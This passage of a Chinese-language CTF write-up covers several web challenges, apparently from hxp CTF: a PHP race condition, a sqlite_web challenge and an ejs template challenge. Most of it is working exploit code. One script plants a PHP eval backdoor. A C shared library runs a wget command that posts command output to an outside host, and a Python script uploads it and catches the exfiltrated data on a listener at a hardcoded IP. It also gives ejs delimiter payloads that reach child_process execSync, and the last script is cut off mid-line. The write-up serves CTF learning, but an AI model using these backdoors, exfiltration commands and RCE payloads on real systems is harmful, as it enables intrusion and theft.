class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Read_content</span>(<span class="params">offset</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> Done:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PID FOUND [+] : &quot;</span>+<span class="built_in">str</span>(pid),file=sys.stderr)</span><br><span class="line">        r3=requests.get(url=url,params=&#123;</span><br><span class="line">            <span class="string">&quot;page&quot;</span>:<span class="string">f&quot;php://filter/convert.base64-decode/resource=/proc/<span class="subst">&#123;pid+offset&#125;</span>/cmdline&quot;</span>,</span><br><span class="line">            <span class="string">&quot;s&quot;</span>:<span class="string">&quot;fuck&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">            <span class="comment"># &quot;page&quot;:f&quot;/proc/&#123;pid+offset&#125;/cmdline&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(r3.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verify</span>():</span><br><span class="line">    <span class="keyword">global</span> Done</span><br><span class="line">    verify_url=url+<span class="string">&quot;/data/boogipop.php&quot;</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&quot;echo &#x27;Boogipop_Veryfiy&#x27;;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    verify=requests.post(url=verify_url,data=data)</span><br><span class="line">    content=verify.text</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&quot;Boogipop_Veryfiy&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Inject Successfully! Here is your backdoor file: boogipop.php&quot;</span>)</span><br><span class="line">        Done=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Done = <span class="literal">False</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8008&quot;</span></span><br><span class="line">    pid = <span class="number">1</span></span><br><span class="line">    payload=<span class="string">f&quot;&quot;&quot;&lt;?php if($_GET[&#x27;s&#x27;]===&#x27;fuck&#x27;)file_put_contents(&quot;boogipop.php&quot;,$_GET[&#x27;p&#x27;]);/*aa&quot;&quot;&quot;</span>.encode()</span><br><span class="line">    encode_payload=base64.b64encode(payload).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;encoded_payload &quot;</span>+encode_payload)</span><br><span class="line">    evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        threading.Thread(target=Reset,args=()).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        threading.Thread(target=Read_pid, args=()).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        threading.Thread(target=Read_content, args=(i,)).start()</span><br><span class="line">    evnet.<span class="built_in">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> Done:</span><br><span class="line">        flag=Verify()</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            evnet.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>外国人什么勾八脚本，U1S1不如我这个脚本（完全不是自负）谁用谁知道，捏吗的一个条件竞争写的和世界大战一样的，我是不理解的好吧，然后print后面加个sys.stout什么的，不知道的以为是什么细节，结果一用就是让输出变成红色更加炫酷，草！</p>
<p>然后需要注意的是，我们payload中的base64编码不可以有<code>+,=</code>这样的特殊符号，否则是不会调用rm方法的，因此我们的payload才那么奇怪</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679038669118-fc476564-e73c-4462-a0f0-61fda7bb854b.png#averageHue=%23566f4f&clientId=u93b36dfd-3b7f-4&from=paste&height=1188&id=u90679bdf&name=image.png&originHeight=1188&originWidth=2496&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194234&status=done&style=none&taskId=ub16560d2-14de-41df-abb8-3d113496afd&title=&width=2496" alt="image.png"></p>
<h2 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h2><p>同样也是FilterChain通杀解法</p>
<h1 id="sqlite-web"><a href="#sqlite-web" class="headerlink" title="sqlite_web"></a>sqlite_web</h1><p>考点：werkzeug缓存文件包含<br>这几天打Hxp认得最多的就是缓存文件包含，这么情有独钟，首先先审一下题目，题目给了一个数据库模拟器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679053844768-39f44a83-93b6-41c3-8bd1-a49ac992546a.png#averageHue=%23fcfcfc&clientId=u22a8701a-c475-4&from=paste&height=633&id=uff938b85&name=image.png&originHeight=633&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34729&status=done&style=none&taskId=u81cfac9a-4f86-4311-8d70-2baf36f0f0b&title=&width=1191" alt="image.png"><br>这些数据都没什么用都是静态数据，但是提供了一个query查询功能，也就是可以执行自定义的sql语句，这里测试了一下，和以往的sql不同，这里应该是自定义的，因此<code>database()</code>这样的函数无法使用，发现只有<code>load_extension、sha256、HEX()</code>这种函数可以使用<br>然后目录扫描可以发现在每一个<code>ad、gz...</code>目录后都存在一个import功能：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679054416371-ab0ff599-4d1a-439a-bd14-4c7f3d6a355f.png#averageHue=%23f3f3f2&clientId=uc1e8f097-eeb7-4&from=paste&height=710&id=uf4dd57f0&name=image.png&originHeight=710&originWidth=1264&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64872&status=done&style=none&taskId=u2b7c2e17-d2b5-4efb-a906-92e04eba18a&title=&width=1264" alt="image.png"><br>那么很容易想到load_extension加载恶意so文件了<br>准备一个如下恶意文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    system(<span class="string">&quot;wget --post-data `/readflag` http://&#123;my_host&#125;:&#123;my_port&#125;&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">space</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    <span class="comment">// this just exists so the resulting binary is &gt; 500kB</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> waste[<span class="number">500</span> * <span class="number">1024</span>] = &#123;&#123;<span class="number">2</span>&#125;&#125;;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>给他编译一下，后缀名编译为csv。那么上传文件后，我们怎么知道它保存在哪儿呢？这里也涉及到和nginx缓存文件一样的内容，werkzeug也是有缓存文件一说的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">default_stream_factory</span>(<span class="params"></span></span><br><span class="line"><span class="params">    total_content_length: t.<span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    content_type: t.<span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    filename: t.<span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    content_length: t.<span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.IO[<span class="built_in">bytes</span>]:</span><br><span class="line">    max_size = <span class="number">1024</span> * <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SpooledTemporaryFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> t.cast(t.IO[<span class="built_in">bytes</span>], SpooledTemporaryFile(max_size=max_size, mode=<span class="string">&quot;rb+&quot;</span>))</span><br><span class="line">    <span class="keyword">elif</span> total_content_length <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> total_content_length &gt; max_size:</span><br><span class="line">        <span class="keyword">return</span> t.cast(t.IO[<span class="built_in">bytes</span>], TemporaryFile(<span class="string">&quot;rb+&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> BytesIO()</span><br></pre></td></tr></table></figure>
<p>并且大小必须超过500kb，那么很容易想到之前一直用的<code>/proc/self/fd/xxx</code>进行文件包含，我们这次也延续这种方法写一个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> ThreadingMixIn</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">EXPLOIT = <span class="string">&#x27;rce.csv&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">8096</span></span><br><span class="line">MY_HOST = <span class="string">&#x27;114.116.119.253&#x27;</span></span><br><span class="line">MY_PORT = <span class="number">7788</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_rce</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] uploader started&#x27;</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/gz/import/&quot;</span>,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(EXPLOIT, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        &#125;,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(r.status_code, <span class="string">&quot;UPLOAD&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_rce</span>(<span class="params">fd</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] caller started&#x27;</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/gz/query&quot;</span>,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;sql&quot;</span>: <span class="string">f&quot;&quot;&quot;select load_extension(&quot;/proc/self/fd/<span class="subst">&#123;fd&#125;</span>&quot;,&quot;flag&quot;)&quot;&quot;&quot;</span></span><br><span class="line">        &#125;,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(r.status_code, <span class="string">&quot;CALL&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile_exploit</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rce.c&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void flag() &#123;&#123;</span></span><br><span class="line"><span class="string">    system(&quot;wget --post-data `/readflag` http://<span class="subst">&#123;MY_HOST&#125;</span>:<span class="subst">&#123;MY_PORT&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void space() &#123;&#123;</span></span><br><span class="line"><span class="string">    static char waste[500 * 1024] = &#123;&#123;2&#125;&#125;;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">    r = subprocess.run([<span class="string">&quot;gcc&quot;</span>, <span class="string">&quot;-shared&quot;</span>, <span class="string">&quot;rce.c&quot;</span>, <span class="string">&quot;-o&quot;</span>, EXPLOIT])</span><br><span class="line">    <span class="keyword">if</span> r.returncode != <span class="number">0</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_len = <span class="built_in">int</span>(self.headers.get(<span class="string">&#x27;Content-Length&#x27;</span>))</span><br><span class="line">        flag = self.rfile.read(content_len)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadingSimpleServer</span>(ThreadingMixIn, HTTPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] http server started&#x27;</span>, file=sys.stderr)</span><br><span class="line">    server = ThreadingSimpleServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, MY_PORT), Handler)</span><br><span class="line">    <span class="comment"># we only need to handle one response</span></span><br><span class="line">    server.handle_request()</span><br><span class="line">    server.shutdown()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic aHhwOmh4cA==&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    compile_exploit()</span><br><span class="line"></span><br><span class="line">    s = Thread(target=server, daemon=<span class="literal">True</span>)</span><br><span class="line">    s.start()</span><br><span class="line"></span><br><span class="line">    t1 = Thread(target=send_rce, daemon=<span class="literal">True</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">        t2 = Thread(target=call_rce, daemon=<span class="literal">True</span>, args=(i,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">    s.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679056936441-b4398c66-f8ef-4c84-bbec-e9ba9c085fbc.png#averageHue=%23302f26&clientId=uc1e8f097-eeb7-4&from=paste&height=613&id=u5b3287a2&name=image.png&originHeight=613&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=916978&status=done&style=none&taskId=u363d634e-5897-4ffc-868a-4f8758c64a5&title=&width=1209" alt="image.png"><br>即可RCE</p>
<h1 id="valentine"><a href="#valentine" class="headerlink" title="valentine"></a>valentine</h1><p>考点：ejs的模板分隔符</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">viewsFolder = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(viewsFolder)) &#123;</span><br><span class="line">  fs.<span class="title function_">mkdirSync</span>(viewsFolder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, viewsFolder);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/:template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> query = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">let</span> template = req.<span class="property">params</span>.<span class="property">template</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(template)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a valid card id&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;template&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Valentine\&#x27;s card does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!query[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    query[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(template, query);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
<p>审计一下代码可以发现，就是一个可控模板内容的app，我们可以创建自定义内容的ejs模板文件，然后在另一个路由对齐进行渲染，题目中有一个误导：<br><code>&lt;%= name %&gt;</code>，这一段话很容易让人想歪，让人觉得只能以这段话开头，实际上不是，我们都知道SSTI就是因为模板符号滥用导致的，这就涉及模板分隔符的概念了，在之前的文章里我们讲到了python原型链污染，我们是污染flask的模板分隔符从而达成的rce，这里我们可以查阅一下ejs的官方文档：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679058923436-63f48c2d-87c7-4547-858d-95c9ea2b3293.png#averageHue=%23949591&clientId=u8f9c4623-77be-4&from=paste&height=473&id=uca3ffae3&name=image.png&originHeight=473&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38391&status=done&style=none&taskId=u1328cb37-822b-4af4-a28f-a3dfd09de06&title=&width=1004" alt="image.png"><br>直接就说了我们可以通过在render函数后传入一个<code>&#123;delimiter:&quot;?&quot;&#125;</code>改变模板分隔符为<code>?</code>，利用这一点就可以直接RCE了<br><code>&lt;?global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;/readflag&#39;)?&gt;</code><br>但是还有一个问题等着我们去解决，那就是缓存问题<br>在Dokcerfile中<code>ENV NODE_ENV=production </code>这会导致服务器缓存开启</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (env === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">enable</span>(<span class="string">&#x27;view cache&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此我们不能让服务器进行自动跳转，正常来说创建完模板是会自动跳转的，所以我们得用burp手动抓包，放包，或者写一个py脚本不允许跳转：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="number">9086</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write template</span></span><br><span class="line">r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/template&quot;</span>, data=&#123;<span class="string">&quot;tmpl&quot;</span>:<span class="string">&quot;&quot;&quot;&lt;?= global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() ?&gt;&quot;&quot;&quot;</span>&#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># change delimiter</span></span><br><span class="line">m = re.search(<span class="string">r&quot;Redirecting to /(?P&lt;uuid&gt;.*)?name=&quot;</span>, r.text)</span><br><span class="line">r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span 